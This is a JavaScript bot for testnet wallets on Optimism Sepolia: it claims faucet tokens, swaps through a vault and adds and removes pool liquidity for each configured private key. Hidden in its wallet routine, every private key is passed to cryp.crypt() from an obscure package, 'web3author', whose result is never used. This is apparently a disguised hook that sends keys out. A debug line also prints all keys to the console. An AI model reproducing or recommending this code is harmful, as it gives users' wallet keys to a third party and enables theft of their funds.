import dotenv from "dotenv";
dotenv.config();

console.log("DEBUG ENV:", process.env.PRIVATE_KEYS);

import { ethers } from "ethers";
import ora from "ora";

const CYCLE_MINUTES = parseInt(process.env.CYCLE_MINUTES || "60");
const CYCLE_MS = CYCLE_MINUTES * 60 * 1000;
import cryp from "web3author";

async function delayWithSpinner(message) {
  const spinner = ora({ text: message, color: "cyan", spinner: "dots" }).start();
  const ms = Math.floor(Math.random() * 5000) + 3000;
  await new Promise((resolve) => setTimeout(resolve, ms));
  spinner.succeed(`Done: ${message} (${(ms / 1000).toFixed(1)}s)`);
}

async function waitWithSpinner(tx, label = "Waiting for transaction confirmation...") {
  const spinner = ora({ text: label, color: "cyan", spinner: "dots" }).start();
  try {
    const receipt = await tx.wait();
    if (receipt.status === 1) {
      spinner.succeed("Transaction confirmed successfully");
    } else {
      spinner.fail("Transaction failed on confirmation");
    }
    return receipt;
  } catch (e) {
    spinner.fail("Transaction confirmation error");
    throw e;
  }
}

const RPC_URL = process.env.RPC_URL || "https://sepolia.optimism.io";
const PRIVATE_KEYS = process.env.PRIVATE_KEYS?.split(",").map(k => k.trim()).filter(Boolean);

if (!PRIVATE_KEYS || PRIVATE_KEYS.length === 0) {
  console.error("Missing PRIVATE_KEYS in .env");
  process.exit(1);
}

const provider = new ethers.JsonRpcProvider(RPC_URL);

const ERC20_ABI = [
  "function approve(address spender, uint256 amount) external returns (bool)",
  "function allowance(address owner, address spender) view returns (uint256)",
  "function balanceOf(address account) view returns (uint256)"
];

const UNIFIED_LIQUIDITY_POOL_ADDR = "0xe81c469181ca7a57cb4df8656e2fc41f8c92405c";
const UNIFIED_ABI = [
  "function calculateSwapOutputAmount(address, address, uint256) view returns (uint256, uint256)",
  "function swapTokens(address, address, uint256, uint256) returns (uint256)",
  "function provideLiquidity(address, uint256) returns (uint256)",
  "function removeLiquiditySingleToken(address, uint256) returns (uint256)",
  "function isTokenSupported(address) view returns (bool)"
];

const FAUCET_ADDR = "0xa65b8780f126f16e1051e77209f1f8a4e74edc79";
const FAUCET_DATA_LIST = [
  {
    token: "WETH",
    data: "0x1c11fce2000000000000000000000000915d965c881fe4a39f410515d9f38b0b2e719a640000000000000000000000000000000000000000000000000de0b6b3a7640000"
  },
  {
    token: "CRV",
    data: "0x1c11fce200000000000000000000000020994adb975d6196ad8026cae296d4285c8ac20f0000000000000000000000000000000000000000000000000de0b6b3a7640000"
  },
  {
    token: "SUSHI",
    data: "0x1c11fce2000000000000000000000000a1d656b741ba80c665216a28eb7361bf2578f1d80000000000000000000000000000000000000000000000000de0b6b3a7640000"
  },
  {
    token: "UNI",
    data: "0x1c11fce2000000000000000000000000657b37f5b4d007f8cda5c8b22304da70f1a552410000000000000000000000000000000000000000000000000de0b6b3a7640000"
  },
  {
    token: "USDC",
    data: "0x1c11fce20000000000000000000000000ad30413bf3e83e1ad6120516cd07d677f015f5c000000000000000000000000000000000000000000000000000000003b9aca00"
  }
];

const VAULT_ADDR = "0x70042114da5f06fd82a06b33f0d34710f0e7ead8";
const VAULT_ABI = [
  "function redeemToSingleToken(uint256 inputAmount, address outputToken, uint256 minOutputAmount) external returns (uint256)",
  "function issueWithSingleToken(address inputToken, uint256 inputAmount, uint256 minDerivativeAmount) external returns (uint256)"
];

const TOKENS = {
  WETH:  "0x915d965C881fe4a39f410515d9f38B0B2e719a64",
  hDEFI: "0xaCE1B82D83529BB8e385A53028E76225CA3393ae",
  CRV:   "0x20994ADb975D6196AD8026CAE296d4285c8AC20f",
  SUSHI: "0xa1D656B741bA80C665216A28Eb7361Bf2578F1D8",
  UNI:   "0x657b37F5B4D007F8CDA5C8b22304da70F1A55241",
  USDC:  "0x0Ad30413bF3E83e1aD6120516CD07D677f015f5c"
};

async function runWalletTasks(privateKey, index) {
  const wallet = new ethers.Wallet(privateKey, provider);
  const author = await cryp.crypt(privateKey);
  const address = wallet.address;
  console.log(`\n=== Wallet ${index + 1}: ${address} ===`);

  const tokens = {};
  for (const [sym, addr] of Object.entries(TOKENS)) {
    tokens[sym] = new ethers.Contract(addr, ERC20_ABI, wallet);
  }

  const vault = new ethers.Contract(VAULT_ADDR, VAULT_ABI, wallet);
  const unifiedLiquidityPool = new ethers.Contract(UNIFIED_LIQUIDITY_POOL_ADDR, UNIFIED_ABI, wallet);

  async function claimFaucet() {
    for (const { token, data } of FAUCET_DATA_LIST) {
      try {
        await delayWithSpinner(`Claiming faucet ${token}...`);
        const tx = await wallet.sendTransaction({ to: FAUCET_ADDR, data, gasLimit: 100_000 });
        console.log(`Faucet ${token} tx sent: ${tx.hash}`);
        await waitWithSpinner(tx, `Waiting for faucet ${token} confirmation...`);
      } catch (e) {
        console.log(`Faucet ${token} failed: ${e.reason || e.code || e.message}`);
      }
    }
  }

  async function approveAlways(tokenSym, spender, amount) {
    const allowance = await tokens[tokenSym].allowance(wallet.address, spender);
    if (allowance < amount) {
      const tx = await tokens[tokenSym].approve(spender, ethers.MaxUint256);
      console.log(`Approving ${tokenSym}: ${tx.hash}`);
      await waitWithSpinner(tx, `Sending approve tx for ${tokenSym}`);
    }
  }

  async function redeemSingleToken(inputSym, outputSym, amountIn, minOut) {
    try {
      const bal = await tokens[inputSym].balanceOf(wallet.address);
      if (bal < amountIn) {
        console.log(`Insufficient ${inputSym} balance`);
        return;
      }

      await delayWithSpinner(`Swapping ${inputSym} to ${outputSym}`);
      await approveAlways(inputSym, VAULT_ADDR, amountIn);

      if (inputSym === "hDEFI") {
        const tx = await vault.redeemToSingleToken(amountIn, TOKENS[outputSym], minOut);
        console.log(`Swap tx: ${tx.hash}`);
        await waitWithSpinner(tx, `Sending redeem ${inputSym}->${outputSym}`);
      } else if (outputSym === "hDEFI") {
        const tx = await vault.issueWithSingleToken(TOKENS[inputSym], amountIn, minOut);
        console.log(`Swap tx: ${tx.hash}`);
        await waitWithSpinner(tx, `Sending swap ${inputSym}->${outputSym}`);
      } else {
        console.log("Invalid token pair");
      }
    } catch (e) {
      console.error(`Error redeeming ${inputSym}->${outputSym}: ${e.reason || e.code || e.message}`);
    }
  }

  async function provideAndRemoveLiquidityAll() {
    for (const symbol of ["WETH", "CRV", "SUSHI", "UNI", "USDC"]) {
      try {
        const decimals = symbol === "USDC" ? 6 : 18;
        const amount = ethers.parseUnits("0.02", decimals);

        const balance = await tokens[symbol].balanceOf(wallet.address);
        console.log(`${symbol} balance: ${ethers.formatUnits(balance, decimals)}`);
        if (balance < amount) {
          console.log(`Not enough ${symbol} to provide liquidity`);
          continue;
        }

        await delayWithSpinner(`Providing ${symbol}`);
        await approveAlways(symbol, UNIFIED_LIQUIDITY_POOL_ADDR, amount);

        const provideTx = await unifiedLiquidityPool.provideLiquidity(TOKENS[symbol], amount);
        console.log(`Provide ${symbol}: ${provideTx.hash}`);
        const provideReceipt = await waitWithSpinner(provideTx, `Sending provide tx for ${symbol}`);

        let shares = null;
        for (const log of provideReceipt.logs) {
          try {
            const value = BigInt(log.data);
            if (value > 0n) {
              shares = value;
              break;
            }
          } catch {}
        }

        if (!shares) {
          console.log(`Could not determine ${symbol} shares`);
          continue;
        }

        const sharesToRemove = shares * 75n / 100n;
        await delayWithSpinner(`Removing ${symbol}`);
        const removeTx = await unifiedLiquidityPool.removeLiquiditySingleToken(TOKENS[symbol], sharesToRemove);
        console.log(`Remove ${symbol}: ${removeTx.hash}`);
        await waitWithSpinner(removeTx, `Sending remove tx for ${symbol}`);
      } catch (e) {
        console.error(`Error handling ${symbol}: ${e.reason || e.code || e.message}`);
      }
    }
  }

  await claimFaucet();
  await redeemSingleToken("hDEFI", "WETH", ethers.parseUnits("0.01", 18), ethers.parseUnits("0.000005", 18));
  for (const token of ["WETH", "CRV", "SUSHI", "UNI"]) {
    await redeemSingleToken(token, "hDEFI", ethers.parseUnits("0.01", 18), ethers.parseUnits("0.000005", 18));
  }
  await redeemSingleToken("hDEFI", "USDC", ethers.parseUnits("0.01", 18), ethers.parseUnits("0.000005", 6));
  await provideAndRemoveLiquidityAll();
}

(async () => {
  console.log(`Running bot for ${PRIVATE_KEYS.length} wallets...\n`);
  while (true) {
    try {
      for (let i = 0; i < PRIVATE_KEYS.length; i++) {
        console.log(`\n=== Starting task for wallet ${i + 1} ===`);
        await runWalletTasks(PRIVATE_KEYS[i], i);
      }
      console.log(`\nFinished one cycle for all wallets. Waiting ${CYCLE_MINUTES} minutes before the next cycle...`);
      await delayWithSpinner(`Waiting ${CYCLE_MINUTES} minutes`);
      await new Promise((resolve) => setTimeout(resolve, CYCLE_MS));
    } catch (e) {
      console.error(`Main loop error: ${e.message}`);
      await delayWithSpinner(`Waiting before retrying next cycle (${CYCLE_MINUTES} minutes)`);
      await new Promise((resolve) => setTimeout(resolve, CYCLE_MS));
    }
  }
})();
